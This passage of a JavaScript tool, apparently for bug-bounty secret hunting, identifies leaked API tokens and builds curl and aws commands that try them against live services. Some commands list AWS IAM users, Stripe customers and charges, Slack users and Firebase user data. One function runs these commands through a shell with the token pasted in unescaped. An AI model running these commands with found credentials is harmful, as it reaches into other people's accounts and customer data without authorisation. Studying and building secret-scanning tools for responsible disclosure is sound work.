            if (sig.patterns.includes(type)) {
                recommendations.push({
                    service,
                    commands: [...new Set(sig.exploitCommands)].slice(0, 5),
                    confidence: sig.exploitCommands.length > 3 ? 'HIGH' : 'MEDIUM'
                });
            }
        }

        // Check successful exploits
        const relevantExploits = this.data.successfulExploits.filter(e => e.type === type);
        if (relevantExploits.length > 0) {
            recommendations.push({
                source: 'learned_exploits',
                commands: relevantExploits.map(e => e.command).filter(Boolean),
                successRate: `${relevantExploits.length} successful exploits recorded`
            });
        }

        return recommendations;
    },

    // Simple hash for tokens
    hashToken(token) {
        let hash = 0;
        for (let i = 0; i < token.length; i++) {
            const char = token.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return hash.toString(16);
    },

    // Guess token type from pattern
    guessType(token) {
        if (token.startsWith('AKIA')) return 'AWS_ACCESS_KEY_ID';
        if (token.startsWith('AIza')) return 'GOOGLE_API_KEY';
        if (token.startsWith('ghp_')) return 'GITHUB_PAT';
        if (token.startsWith('gho_')) return 'GITHUB_OAUTH';
        if (token.startsWith('sk_live_')) return 'STRIPE_SECRET_KEY';
        if (token.startsWith('sk-ant-')) return 'ANTHROPIC_API_KEY';
        if (token.startsWith('gsk_')) return 'GROQ_API_KEY';
        if (token.startsWith('sk-')) return 'OPENAI_API_KEY';
        if (token.startsWith('xoxb-')) return 'SLACK_BOT_TOKEN';
        if (token.startsWith('xoxp-')) return 'SLACK_USER_TOKEN';
        if (token.includes('.firebaseio.com')) return 'FIREBASE_DB_URL';
        return 'UNKNOWN';
    },

    // Get memory stats
    getStats() {
        return {
            totalTokens: this.data.totalTokensAnalyzed,
            totalExploits: this.data.totalExploitsFound,
            servicesLearned: Object.keys(this.data.serviceSignatures).length,
            conversationsRecorded: this.data.aiConversations.length,
            lastUpdated: this.data.lastUpdated
        };
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// TOKEN RESEARCH ENGINE - Deep Analysis of Found Tokens
// ══════════════════════════════════════════════════════════════════════════════

const TokenResearch = {
    // Service database for token research
    serviceDB: {
        'AWS_ACCESS_KEY_ID': {
            service: 'Amazon Web Services',
            docUrl: 'https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html',
            testEndpoint: 'https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15',
            revokeUrl: 'https://console.aws.amazon.com/iam/',
            bountyRange: '$500-$5000',
            impact: 'Full AWS account access, S3 buckets, EC2, databases'
        },
        'GOOGLE_API_KEY': {
            service: 'Google Cloud Platform',
            docUrl: 'https://cloud.google.com/docs/authentication/api-keys',
            testEndpoint: 'https://www.googleapis.com/oauth2/v1/tokeninfo',
            revokeUrl: 'https://console.cloud.google.com/apis/credentials',
            bountyRange: '$100-$1000',
            impact: 'Depends on enabled APIs - Maps, YouTube, Firebase, etc.'
        },
        'GITHUB_PAT': {
            service: 'GitHub',
            docUrl: 'https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token',
            testEndpoint: 'https://api.github.com/user',
            revokeUrl: 'https://github.com/settings/tokens',
            bountyRange: '$500-$3000',
            impact: 'Repository access, code commits, org secrets'
        },
        'STRIPE_SECRET_KEY': {
            service: 'Stripe',
            docUrl: 'https://stripe.com/docs/keys',
            testEndpoint: 'https://api.stripe.com/v1/balance',
            revokeUrl: 'https://dashboard.stripe.com/apikeys',
            bountyRange: '$1000-$5000',
            impact: 'Payment processing, customer data, refunds'
        },
        'SLACK_BOT_TOKEN': {
            service: 'Slack',
            docUrl: 'https://api.slack.com/authentication/token-types',
            testEndpoint: 'https://slack.com/api/auth.test',
            revokeUrl: 'https://api.slack.com/apps',
            bountyRange: '$500-$2000',
            impact: 'Workspace messages, user info, file access'
        },
        'OPENAI_API_KEY': {
            service: 'OpenAI',
            docUrl: 'https://platform.openai.com/docs/api-reference/authentication',
            testEndpoint: 'https://api.openai.com/v1/models',
            revokeUrl: 'https://platform.openai.com/api-keys',
            bountyRange: '$100-$500',
            impact: 'API billing, model access, usage data'
        },
        'FIREBASE_DB_URL': {
            service: 'Firebase Realtime Database',
            docUrl: 'https://firebase.google.com/docs/database',
            testEndpoint: null,  // Append .json to URL
            revokeUrl: 'https://console.firebase.google.com/',
            bountyRange: '$500-$2000',
            impact: 'Database read/write, user data, app data'
        },
        'ANTHROPIC_API_KEY': {
            service: 'Anthropic Claude',
            docUrl: 'https://docs.anthropic.com/en/api/getting-started',
            testEndpoint: 'https://api.anthropic.com/v1/messages',
            revokeUrl: 'https://console.anthropic.com/settings/keys',
            bountyRange: '$100-$500',
            impact: 'API billing, usage data'
        },
        'GROQ_API_KEY': {
            service: 'Groq AI',
            docUrl: 'https://console.groq.com/docs',
            testEndpoint: 'https://api.groq.com/openai/v1/models',
            revokeUrl: 'https://console.groq.com/keys',
            bountyRange: '$50-$200',
            impact: 'API access, usage tracking'
        }
    },

    // Research a token deeply
    async research(token, type) {
        const research = {
            token: token.substring(0, 10) + '...',
            type,
            service: null,
            documentation: null,
            testEndpoint: null,
            revokeUrl: null,
            bountyEstimate: null,
            impact: null,
            exploitCommands: [],
            validationResult: null
        };

        // Get service info
        const serviceInfo = this.serviceDB[type];
        if (serviceInfo) {
            research.service = serviceInfo.service;
            research.documentation = serviceInfo.docUrl;
            research.testEndpoint = serviceInfo.testEndpoint;
            research.revokeUrl = serviceInfo.revokeUrl;
            research.bountyEstimate = serviceInfo.bountyRange;
            research.impact = serviceInfo.impact;
        }

        // Generate test commands based on type
        research.exploitCommands = this.generateTestCommands(token, type);

        // Get recommendations from memory
        const memoryRecommendations = AIMemory.getExploitRecommendations(type);
        if (memoryRecommendations.length > 0) {
            research.learnedCommands = memoryRecommendations;
        }

        return research;
    },

    // Generate test commands for a token
    generateTestCommands(token, type) {
        const commands = [];

        switch (type) {
            case 'AWS_ACCESS_KEY_ID':
                commands.push(`aws sts get-caller-identity --access-key-id ${token}`);
                commands.push(`aws s3 ls --access-key-id ${token}`);
                commands.push(`aws iam list-users --access-key-id ${token}`);
                break;

            case 'GOOGLE_API_KEY':
            case 'FIREBASE_API_KEY':
                commands.push(`curl "https://www.googleapis.com/customsearch/v1?key=${token}&cx=test&q=test"`);
                commands.push(`curl "https://maps.googleapis.com/maps/api/staticmap?key=${token}&center=0,0&zoom=1&size=1x1"`);
                commands.push(`curl "https://www.googleapis.com/youtube/v3/search?key=${token}&part=snippet&q=test"`);
                break;

            case 'GITHUB_PAT':
            case 'GITHUB_OAUTH':
                commands.push(`curl -H "Authorization: token ${token}" https://api.github.com/user`);
                commands.push(`curl -H "Authorization: token ${token}" https://api.github.com/user/repos`);
                commands.push(`curl -H "Authorization: token ${token}" https://api.github.com/user/emails`);
                break;

            case 'STRIPE_SECRET_KEY':
                commands.push(`curl -u ${token}: https://api.stripe.com/v1/balance`);
                commands.push(`curl -u ${token}: https://api.stripe.com/v1/customers?limit=5`);
                commands.push(`curl -u ${token}: https://api.stripe.com/v1/charges?limit=5`);
                break;

            case 'SLACK_BOT_TOKEN':
            case 'SLACK_USER_TOKEN':
                commands.push(`curl -H "Authorization: Bearer ${token}" https://slack.com/api/auth.test`);
                commands.push(`curl -H "Authorization: Bearer ${token}" https://slack.com/api/users.list`);
                commands.push(`curl -H "Authorization: Bearer ${token}" https://slack.com/api/conversations.list`);
                break;

            case 'OPENAI_API_KEY':
                commands.push(`curl -H "Authorization: Bearer ${token}" https://api.openai.com/v1/models`);
                commands.push(`curl -H "Authorization: Bearer ${token}" https://api.openai.com/v1/usage`);
                break;

            case 'ANTHROPIC_API_KEY':
                commands.push(`curl -H "x-api-key: ${token}" -H "anthropic-version: 2023-06-01" https://api.anthropic.com/v1/messages`);
                break;

            case 'GROQ_API_KEY':
                commands.push(`curl -H "Authorization: Bearer ${token}" https://api.groq.com/openai/v1/models`);
                break;

            case 'FIREBASE_DB_URL':
                commands.push(`curl "${token}/.json"`);
                commands.push(`curl "${token}/users.json"`);
                break;

            default:
                commands.push(`# Unknown token type: ${type}`);
                commands.push(`# Manual research required`);
        }

        return commands;
    },

    // Validate a token by actually testing it
    async validate(token, type) {
        const results = {
            valid: false,
            live: false,
            permissions: [],
            error: null,
            rawOutput: null
        };

        const commands = this.generateTestCommands(token, type);
        if (commands.length === 0) {
            results.error = 'No validation commands for this token type';
            return results;
        }

        // Execute first command
        const cmd = commands[0];

        return new Promise((resolve) => {
            exec(cmd, { timeout: 30000 }, (error, stdout, stderr) => {
                results.rawOutput = stdout || stderr;

                if (error) {
                    results.error = error.message;
                    // Check if error indicates invalid key
                    if (results.rawOutput?.includes('invalid') ||
                        results.rawOutput?.includes('unauthorized') ||
                        results.rawOutput?.includes('denied')) {
                        results.valid = false;
                    }
                } else if (stdout) {
                    results.valid = true;
                    results.live = true;

                    // Parse permissions from output
                    try {
                        const json = JSON.parse(stdout);
                        if (json.scopes) results.permissions = json.scopes;
                        if (json.login) results.permissions.push('user:read');
                        if (json.email) results.permissions.push('email:read');
                    } catch (e) {
                        // Not JSON, but still valid
                    }
                }

                // Learn from this validation
                AIMemory.learnFromToken(token, type, { validated: true }, {
                    success: results.live,
                    command: cmd,
                    output: results.rawOutput?.substring(0, 500)
                });

                resolve(results);
            });
        });
    }
};

// ═══════════════════════════════════════════════════════════════════════════════════
// 🚀 PROFESSIONAL RATE LIMITER - TOKEN BUCKET + SLIDING WINDOW + ADAPTIVE CONTROL
// Industry-standard rate limiting that prevents 429 errors with SINGLE KEY
// ═══════════════════════════════════════════════════════════════════════════════════

const ProRateLimiter = {
    // === TOKEN BUCKET CONFIGURATION (Per Provider) ===
    buckets: {
        groq: {
            tokens: 30,           // Current tokens available
            maxTokens: 30,        // Max burst capacity (Groq: 30 RPM free tier)
            refillRate: 0.5,      // Tokens added per second (30 per minute = 0.5/s)
            lastRefill: Date.now(),
            requestsPerMinute: 30,
            tokensPerMinute: 6000, // Token limit (Groq free tier)
            usedTokensThisMinute: 0,
            minuteStart: Date.now()
        },
        gemini: {
            tokens: 15,
            maxTokens: 15,        // Gemini: 15 RPM free tier
            refillRate: 0.25,
            lastRefill: Date.now(),
            requestsPerMinute: 15,
            tokensPerMinute: 32000,
            usedTokensThisMinute: 0,
            minuteStart: Date.now()
        },
        openai: {
            tokens: 60,
            maxTokens: 60,        // OpenAI: varies by tier
            refillRate: 1.0,
            lastRefill: Date.now(),
            requestsPerMinute: 60,
            tokensPerMinute: 90000,
            usedTokensThisMinute: 0,
            minuteStart: Date.now()
        },
        deepseek: {
            tokens: 60,
            maxTokens: 60,
            refillRate: 1.0,
            lastRefill: Date.now(),
            requestsPerMinute: 60,
            tokensPerMinute: 100000,
            usedTokensThisMinute: 0,
            minuteStart: Date.now()
        },
        together: {
            tokens: 60,
            maxTokens: 60,
            refillRate: 1.0,
            lastRefill: Date.now(),
            requestsPerMinute: 60,
            tokensPerMinute: 100000,
            usedTokensThisMinute: 0,
            minuteStart: Date.now()
        },
        mistral: {
            tokens: 60,
            maxTokens: 60,
            refillRate: 1.0,
            lastRefill: Date.now(),
            requestsPerMinute: 60,
            tokensPerMinute: 100000,
            usedTokensThisMinute: 0,
            minuteStart: Date.now()
        },
        huggingface: {
            tokens: 10,
            maxTokens: 10,        // HuggingFace free: very limited
            refillRate: 0.17,     // ~10 per minute
            lastRefill: Date.now(),
            requestsPerMinute: 10,
            tokensPerMinute: 5000,
            usedTokensThisMinute: 0,
            minuteStart: Date.now()
        }
    },

    // === SLIDING WINDOW TRACKING ===
    requestLog: {},           // { provider: [timestamp1, timestamp2, ...] }
    windowSizeMs: 60000,      // 1 minute window

    // === ADAPTIVE CONTROL ===
    adaptive: {
        enabled: true,
        safetyMargin: 0.8,    // Use only 80% of limit to stay safe
        minDelay: 500,        // Minimum delay between requests (ms)
        maxDelay: 30000,      // Maximum delay (30s)
        backoffMultiplier: 2, // Multiplier on rate limit
        currentPenalty: {},   // { provider: penaltyMultiplier }
        lastRateLimit: {},    // { provider: timestamp }
        successStreak: {},    // { provider: count } - track consecutive successes
        headerLimits: {}      // { provider: { remaining, reset, limit } }
    },

    // === QUEUE SYSTEM ===
    queue: [],                // [{ provider, resolve, reject, priority }]
    processing: false,
    queueEnabled: true,

    // === INITIALIZATION ===
    init() {
        // Initialize requestLog and adaptive state for each provider
        Object.keys(this.buckets).forEach(provider => {
            this.requestLog[provider] = [];
            this.adaptive.currentPenalty[provider] = 1;
            this.adaptive.successStreak[provider] = 0;
            this.adaptive.lastRateLimit[provider] = 0;
        });
        log('🚀 ProRateLimiter initialized - Industry-grade rate limiting active', 'green');
    },

    // === TOKEN BUCKET: REFILL TOKENS ===
    refillBucket(provider) {
        const bucket = this.buckets[provider];
        if (!bucket) return;

        const now = Date.now();
        const elapsed = (now - bucket.lastRefill) / 1000; // seconds
        const tokensToAdd = elapsed * bucket.refillRate;

        bucket.tokens = Math.min(bucket.maxTokens, bucket.tokens + tokensToAdd);
        bucket.lastRefill = now;

        // Reset minute counter if minute passed
        if (now - bucket.minuteStart >= 60000) {
            bucket.usedTokensThisMinute = 0;
            bucket.minuteStart = now;
        }
    },

    // === SLIDING WINDOW: COUNT RECENT REQUESTS ===
    countRecentRequests(provider) {
        const now = Date.now();
        const log = this.requestLog[provider] || [];

        // Filter to keep only requests within window
        this.requestLog[provider] = log.filter(ts => now - ts < this.windowSizeMs);

        return this.requestLog[provider].length;
    },

    // === CALCULATE OPTIMAL DELAY ===
    calculateDelay(provider) {
        const bucket = this.buckets[provider];
        if (!bucket) return this.adaptive.minDelay;

        this.refillBucket(provider);

        const recentRequests = this.countRecentRequests(provider);
        const penalty = this.adaptive.currentPenalty[provider] || 1;

        // Calculate how much of the rate limit we've used
        const usageRatio = recentRequests / (bucket.requestsPerMinute * this.adaptive.safetyMargin);

        // Check header-based limits if available
        const headerLimit = this.adaptive.headerLimits[provider];
        if (headerLimit && headerLimit.remaining !== undefined) {
            const headerRatio = 1 - (headerLimit.remaining / headerLimit.limit);
            // Use the more conservative ratio
            const effectiveRatio = Math.max(usageRatio, headerRatio);

            if (effectiveRatio > 0.9) {
                // Very close to limit - long delay
                return Math.min(this.adaptive.maxDelay, 10000 * penalty);
            } else if (effectiveRatio > 0.7) {
                // Getting close - moderate delay
                return Math.min(this.adaptive.maxDelay, 5000 * penalty);
            }
        }

        // === ADAPTIVE DELAY CALCULATION ===
        let baseDelay;

        if (usageRatio >= 0.9) {
            // At 90%+ usage - aggressive slowdown
            baseDelay = 15000;
        } else if (usageRatio >= 0.7) {
            // At 70%+ usage - moderate slowdown
            baseDelay = 8000;
        } else if (usageRatio >= 0.5) {
            // At 50%+ usage - light slowdown
            baseDelay = 4000;
        } else if (usageRatio >= 0.3) {
            // Normal operation
            baseDelay = 2500;
        } else {
            // Low usage - can go faster
            baseDelay = 1500;
        }

        // Apply penalty multiplier from recent rate limits
        const penalizedDelay = baseDelay * penalty;

        // Add jitter to prevent synchronized requests (±15%)
        const jitter = penalizedDelay * (Math.random() * 0.3 - 0.15);

        return Math.max(this.adaptive.minDelay, Math.min(this.adaptive.maxDelay, penalizedDelay + jitter));
    },

    // === CHECK IF CAN MAKE REQUEST ===
    canRequest(provider) {
        const bucket = this.buckets[provider];
        if (!bucket) return true;

        this.refillBucket(provider);

        // Check token bucket
        if (bucket.tokens < 1) {
            return false;
        }

        // Check sliding window
        const recentRequests = this.countRecentRequests(provider);
        const safeLimit = Math.floor(bucket.requestsPerMinute * this.adaptive.safetyMargin);

        if (recentRequests >= safeLimit) {
            return false;
        }

        return true;
    },

    // === CONSUME A TOKEN (BEFORE REQUEST) ===
    consumeToken(provider) {
        const bucket = this.buckets[provider];
        if (!bucket) return;

        this.refillBucket(provider);

        bucket.tokens = Math.max(0, bucket.tokens - 1);
        this.requestLog[provider].push(Date.now());
    },

    // === HANDLE RATE LIMIT RESPONSE ===
    onRateLimit(provider, retryAfterMs = null) {
        const bucket = this.buckets[provider];

        // Record rate limit event
        this.adaptive.lastRateLimit[provider] = Date.now();
        this.adaptive.successStreak[provider] = 0;

        // Increase penalty (exponential backoff)
        const currentPenalty = this.adaptive.currentPenalty[provider] || 1;
        this.adaptive.currentPenalty[provider] = Math.min(8, currentPenalty * this.adaptive.backoffMultiplier);

        // Drain the bucket
        if (bucket) {
            bucket.tokens = 0;
        }

        // If we have retry-after header, use it
        if (retryAfterMs) {
            const waitSec = Math.ceil(retryAfterMs / 1000);
            log(`⏳ Rate limited. Server says wait ${waitSec}s. Penalty now ${this.adaptive.currentPenalty[provider].toFixed(1)}x`, 'yellow');
        } else {
            log(`⏳ Rate limited. Penalty increased to ${this.adaptive.currentPenalty[provider].toFixed(1)}x`, 'yellow');
        }
    },

    // === HANDLE SUCCESSFUL RESPONSE ===
    onSuccess(provider) {
        // Increase success streak
        this.adaptive.successStreak[provider] = (this.adaptive.successStreak[provider] || 0) + 1;

        // Reduce penalty after consecutive successes
        if (this.adaptive.successStreak[provider] >= 3) {
            const currentPenalty = this.adaptive.currentPenalty[provider] || 1;
            this.adaptive.currentPenalty[provider] = Math.max(1, currentPenalty * 0.8);

            if (currentPenalty > 1) {
                log(`✅ Success streak! Penalty reduced to ${this.adaptive.currentPenalty[provider].toFixed(1)}x`, 'green');
            }
        }
    },

    // === UPDATE FROM RESPONSE HEADERS ===
    updateFromHeaders(provider, headers) {
        if (!headers) return;

        // Common rate limit headers
        const remaining = headers['x-ratelimit-remaining'] ||
            headers['x-rate-limit-remaining'] ||
            headers['ratelimit-remaining'];

        const limit = headers['x-ratelimit-limit'] ||
            headers['x-rate-limit-limit'] ||
            headers['ratelimit-limit'];

        const reset = headers['x-ratelimit-reset'] ||
            headers['x-rate-limit-reset'] ||
            headers['ratelimit-reset'];

        if (remaining !== undefined || limit !== undefined) {
            this.adaptive.headerLimits[provider] = {
                remaining: parseInt(remaining) || 0,
                limit: parseInt(limit) || 60,
                reset: reset ? parseInt(reset) * 1000 : Date.now() + 60000
            };

            // Adjust bucket based on actual limits
            const bucket = this.buckets[provider];
            if (bucket && limit) {
                bucket.requestsPerMinute = parseInt(limit);
                bucket.maxTokens = Math.min(parseInt(limit), bucket.maxTokens);
            }
        }
    },

    // === SMART WAIT - MAIN ENTRY POINT ===
    async smartWait(provider) {
        provider = (provider || 'groq').toLowerCase();

        // Calculate optimal delay
        const delay = this.calculateDelay(provider);

        // Check if we should wait
        if (!this.canRequest(provider)) {
            const bucket = this.buckets[provider];
            const waitTime = bucket ? Math.ceil((60000 - (Date.now() - bucket.minuteStart)) / 1000) : 30;
            log(`⏳ Near rate limit for ${provider.toUpperCase()}. Smart waiting ${waitTime}s...`, 'yellow');
            await this._delay(Math.min(waitTime * 1000, this.adaptive.maxDelay));
        } else if (delay > 1000) {
            log(`⏳ Smart delay: ${Math.ceil(delay / 1000)}s (${provider.toUpperCase()} protection)`, 'dim');
            await this._delay(delay);
        } else {
            // Small delay always for safety
            await this._delay(delay);
        }

        // Consume token before making request
        this.consumeToken(provider);
    },

    // === GET STATUS FOR UI ===
    getStatus(provider) {
        provider = provider.toLowerCase();
        const bucket = this.buckets[provider];
        if (!bucket) return null;

        this.refillBucket(provider);
        const recentRequests = this.countRecentRequests(provider);

        return {
            provider: provider.toUpperCase(),
            tokensAvailable: Math.floor(bucket.tokens),
            maxTokens: bucket.maxTokens,
            requestsInWindow: recentRequests,
            maxRequestsPerMinute: bucket.requestsPerMinute,
            usagePercent: Math.round((recentRequests / bucket.requestsPerMinute) * 100),
            penalty: this.adaptive.currentPenalty[provider]?.toFixed(1) || '1.0',
            successStreak: this.adaptive.successStreak[provider] || 0,
            safeToRequest: this.canRequest(provider)
        };
    },

    // === SHOW ALL PROVIDER STATUS ===
    showStatus() {
        console.log(`\n${C.bold}${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}`);
        console.log(`${C.bold}${C.cyan}   🚀 PRO RATE LIMITER STATUS${C.reset}`);
        console.log(`${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}`);

        Object.keys(this.buckets).forEach(provider => {
            const status = this.getStatus(provider);
            if (status) {
                const usageBar = '█'.repeat(Math.floor(status.usagePercent / 10)) +
                    '░'.repeat(10 - Math.floor(status.usagePercent / 10));
                const color = status.usagePercent > 80 ? C.red :
                    status.usagePercent > 50 ? C.yellow : C.green;

                console.log(`${C.bold}${provider.toUpperCase().padEnd(12)}${C.reset} [${color}${usageBar}${C.reset}] ${status.usagePercent}% | Tokens: ${status.tokensAvailable}/${status.maxTokens} | Penalty: ${status.penalty}x | ${status.safeToRequest ? C.green + '✓ SAFE' : C.red + '✗ WAIT'}${C.reset}`);
            }
        });

        console.log(`${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);
    },

    // === HELPER ===
    _delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
};

// Initialize ProRateLimiter
ProRateLimiter.init();

// ═══════════════════════════════════════════════════════════════════════════════════
// � AI REQUEST QUEUE - SMART KEY DISTRIBUTION SYSTEM
// Prevents rate limiting by serializing requests per key and distributing load
// ═══════════════════════════════════════════════════════════════════════════════════

const AIRequestQueue = {
    // === STATE ===
    enabled: true,
    queue: [],                    // Pending requests: [{ id, provider, prompt, context, resolve, reject, timestamp }]
    inFlight: {},                 // Tracks requests in progress per provider-key: { 'groq_0': true, 'groq_1': false }
    keyUsage: {},                 // Tracks usage count per key: { 'groq_0': 5, 'groq_1': 3 }
    processing: false,
    processInterval: null,
    requestId: 0,

    // === CONFIG ===
    config: {
        maxQueueSize: 200,         // Max pending requests
        processingInterval: 100,   // Check queue every 100ms
        minDelayBetweenRequests: 500,  // Min 500ms between requests to same key
        maxConcurrentPerProvider: 3,    // Max slots per provider (if multiple keys)
        priorityBoost: { urgent: 100, high: 50, normal: 0, low: -50 },
        timeout: 60000             // Request timeout 60s
    },

    // === STATS ===
    stats: {
        totalQueued: 0,
        totalProcessed: 0,
        totalFailed: 0,
        avgWaitTime: 0,
        lastProcessed: null,
        byProvider: {}
    },

    // === INITIALIZE ===
    init() {
        // Start processing loop
        if (!this.processInterval) {
            this.processInterval = setInterval(() => this.processQueue(), this.config.processingInterval);
        }

        // Initialize stats for all providers
        const providers = ['groq', 'gemini', 'openai', 'deepseek', 'together', 'mistral', 'anthropic', 'openrouter', 'huggingface'];
        providers.forEach(p => {
            this.stats.byProvider[p] = { queued: 0, processed: 0, failed: 0, avgTime: 0 };
        });

        console.log(`${C.green}📋 AIRequestQueue initialized - Smart key distribution active${C.reset}`);
    },

    // === ADD REQUEST TO QUEUE ===
    async enqueue(provider, prompt, context = {}, executeFn) {
        if (!this.enabled) {
            // Bypass queue if disabled
            return executeFn();
        }

        if (this.queue.length >= this.config.maxQueueSize) {
            console.log(`${C.red}⚠️ Request queue full (${this.config.maxQueueSize}). Dropping request.${C.reset}`);
            return { error: 'Request queue full' };
        }

        return new Promise((resolve, reject) => {
            const requestId = ++this.requestId;
            const priority = context.priority || 'normal';

            const request = {
                id: requestId,
                provider: provider.toLowerCase(),
                prompt: prompt.substring(0, 100), // Store truncated for debugging
                context,
                executeFn,  // The actual function to execute
                resolve,
                reject,
                priority,
                priorityScore: this.config.priorityBoost[priority] || 0,
                timestamp: Date.now(),
                status: 'queued'
            };

            // Insert in priority order
            let inserted = false;
            for (let i = 0; i < this.queue.length; i++) {
                if (this.queue[i].priorityScore < request.priorityScore) {
                    this.queue.splice(i, 0, request);
                    inserted = true;
                    break;
                }
            }
            if (!inserted) {
                this.queue.push(request);
            }

            this.stats.totalQueued++;
            this.stats.byProvider[provider]?.queued && this.stats.byProvider[provider].queued++;

            // Debug log for queue status (only when > 5 items)
            if (this.queue.length > 5) {
                BackgroundLogger?.log?.(`[Queue] ${this.queue.length} pending, added ${provider} request #${requestId}`, 'queue');
            }
        });
    },

    // === GET BEST KEY FOR PROVIDER ===
    getBestKey(provider) {
        provider = provider.toLowerCase();

        // Get key pool from TerminalAI (will be set up later)
        if (typeof TerminalAI !== 'undefined' && TerminalAI.keyPool) {
            const pool = TerminalAI.keyPool[provider];

            if (!pool || pool.length === 0) {
                // No pool - use single key
                return { keyIndex: 0, key: null };
            }

            // Find key with lowest usage that's not in flight
            let bestKey = null;
            let bestIndex = -1;
            let lowestUsage = Infinity;

            const now = Date.now();

            for (let i = 0; i < pool.length; i++) {
                const keyId = `${provider}_${i}`;
                const status = TerminalAI.keyPoolStatus?.[keyId];
                const cooldown = TerminalAI.keyPoolCooldowns?.[keyId] || 0;
                const inFlight = this.inFlight[keyId];
                const usage = this.keyUsage[keyId] || 0;

                // Skip dead keys
                if (status === 'dead') continue;

                // Skip rate limited keys still in cooldown
                if (status === 'rate_limited' && now < cooldown) continue;

                // Skip keys with in-flight requests (KEY FEATURE!)
                if (inFlight) continue;

                // Pick lowest usage key
                if (usage < lowestUsage) {
                    lowestUsage = usage;
                    bestKey = pool[i];
                    bestIndex = i;
                }
            }

            if (bestIndex >= 0) {
                return { keyIndex: bestIndex, key: bestKey };
            }

            // All keys busy or rate limited - return null to wait
            return { keyIndex: -1, key: null, allBusy: true };
        }

        return { keyIndex: 0, key: null };
    },

    // === PROCESS QUEUE ===
    async processQueue() {
        if (this.processing || this.queue.length === 0) return;

        this.processing = true;

        try {
            // Find a request we can process
            for (let i = 0; i < this.queue.length; i++) {
                const request = this.queue[i];

                // Check if we can process this provider
                const { keyIndex, key, allBusy } = this.getBestKey(request.provider);

                if (allBusy) {
                    // All keys for this provider are busy - try next request
                    continue;
                }

                // Check ProRateLimiter
                if (!ProRateLimiter.canRequest(request.provider)) {
                    continue;
                }

                // Remove from queue
                this.queue.splice(i, 1);

                // Mark key as in-flight
                const keyId = `${request.provider}_${keyIndex}`;
                this.inFlight[keyId] = true;
                this.keyUsage[keyId] = (this.keyUsage[keyId] || 0) + 1;
                request.status = 'processing';
                request.keyIndex = keyIndex;

                // Execute request (don't await - process in background)
                this.executeRequest(request, keyId)
                    .catch(err => {
                        BackgroundLogger?.log?.(`[Queue] Execute error: ${err.message}`, 'queue', 'ERROR');
                    });

                // Only process one per cycle to maintain fairness
                break;
            }
        } finally {
            this.processing = false;
        }
    },

    // === EXECUTE REQUEST ===
    async executeRequest(request, keyId) {
        const startTime = Date.now();

        try {
            // Execute the actual request
            const result = await Promise.race([
                request.executeFn(),
                new Promise((_, reject) =>
                    setTimeout(() => reject(new Error('Request timeout')), this.config.timeout)
                )
            ]);

            // Update stats
            const waitTime = startTime - request.timestamp;
            const processTime = Date.now() - startTime;
            this.stats.totalProcessed++;
            this.stats.lastProcessed = Date.now();
            this.stats.avgWaitTime = (this.stats.avgWaitTime * 0.9) + (waitTime * 0.1);

            if (this.stats.byProvider[request.provider]) {
                this.stats.byProvider[request.provider].processed++;
                this.stats.byProvider[request.provider].avgTime =
                    (this.stats.byProvider[request.provider].avgTime * 0.9) + (processTime * 0.1);
            }

            // Resolve the promise
            request.resolve(result);

        } catch (error) {
            this.stats.totalFailed++;
            if (this.stats.byProvider[request.provider]) {
                this.stats.byProvider[request.provider].failed++;
            }

            // Check if rate limited
            if (error.message?.includes('Rate') || error.message?.includes('429')) {
                // Mark key as rate limited in TerminalAI if available
                if (typeof TerminalAI !== 'undefined') {
                    TerminalAI.markKeyRateLimited?.(request.provider, 60000);
                }
            }

            request.reject(error);

        } finally {
            // Release key after delay to prevent hammering
            setTimeout(() => {
                delete this.inFlight[keyId];
            }, this.config.minDelayBetweenRequests);
        }
    },

    // === GET STATUS ===
    getStatus() {
        const inFlightCount = Object.values(this.inFlight).filter(v => v).length;

        return {
            enabled: this.enabled,
            queueLength: this.queue.length,
            inFlight: inFlightCount,
            totalProcessed: this.stats.totalProcessed,
            totalFailed: this.stats.totalFailed,
            avgWaitTime: Math.round(this.stats.avgWaitTime),
            byProvider: { ...this.stats.byProvider }
        };
    },

    // === SHOW STATUS ===
    showStatus() {
        const status = this.getStatus();

        console.log(`\n${C.bold}${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}`);
        console.log(`${C.bold}${C.cyan}   📋 AI REQUEST QUEUE STATUS${C.reset}`);
        console.log(`${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);

        console.log(`${C.bold}  Status:${C.reset} ${status.enabled ? C.green + 'ENABLED' : C.red + 'DISABLED'}${C.reset}`);
        console.log(`${C.bold}  Queued:${C.reset} ${status.queueLength} requests`);
        console.log(`${C.bold}  In-Flight:${C.reset} ${status.inFlight} requests`);
        console.log(`${C.bold}  Processed:${C.reset} ${status.totalProcessed}`);
        console.log(`${C.bold}  Failed:${C.reset} ${status.totalFailed}`);
        console.log(`${C.bold}  Avg Wait:${C.reset} ${status.avgWaitTime}ms`);

        console.log(`\n${C.bold}  By Provider:${C.reset}`);
        Object.entries(status.byProvider).forEach(([provider, stats]) => {
            if (stats.processed > 0 || stats.queued > 0) {
                console.log(`    ${provider.padEnd(12)} : ${stats.processed} processed, ${stats.failed} failed, ~${Math.round(stats.avgTime)}ms avg`);
            }
        });

        // Show in-flight keys
        const activeKeys = Object.entries(this.inFlight).filter(([_, v]) => v).map(([k, _]) => k);
        if (activeKeys.length > 0) {
            console.log(`\n${C.bold}  Active Keys:${C.reset} ${activeKeys.join(', ')}`);
        }

        console.log(`\n${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);
    },

    // === ENABLE/DISABLE ===
    enable() {
        this.enabled = true;
        console.log(`${C.green}✅ AI Request Queue ENABLED${C.reset}`);
    },
    disable() {
        this.enabled = false;
        console.log(`${C.yellow}⚠️ AI Request Queue DISABLED - requests bypass queue${C.reset}`);
    },

    // === CLEAR QUEUE ===
    clear() {
        const count = this.queue.length;
        this.queue.forEach(req => req.reject(new Error('Queue cleared')));
        this.queue = [];
        console.log(`${C.yellow}🗑️ Cleared ${count} pending requests${C.reset}`);
    }
};

// Initialize AIRequestQueue
AIRequestQueue.init();

